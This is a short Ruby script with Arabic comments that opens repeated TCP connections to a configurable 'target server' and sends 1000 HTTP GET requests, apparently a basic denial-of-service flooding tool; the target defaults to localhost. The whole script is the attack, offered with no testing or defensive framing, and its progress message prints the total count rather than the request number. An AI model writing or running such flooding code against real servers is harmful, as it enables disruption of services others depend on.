require 'socket'

target = "127.0.0.1"  # عنوان IP أو اسم النطاق للخادم المستهدف
port = 80             # المنفذ الذي سيتم استهدافه (عادة ما يكون 80 أو 443 للويب)
requests = 1000       # عدد الطلبات التي سيتم إرسالها

# إنشاء اتصال TCP بالخادم
requests.times do
  begin
    socket = TCPSocket.open(target, port)
    socket.puts "GET / HTTP/1.1\r\nHost: #{target}\r\n\r\n"
    socket.close
    puts "تم إرسال الطلب رقم #{requests}"
  rescue
    puts "فشل في إرسال الطلب"
  end
end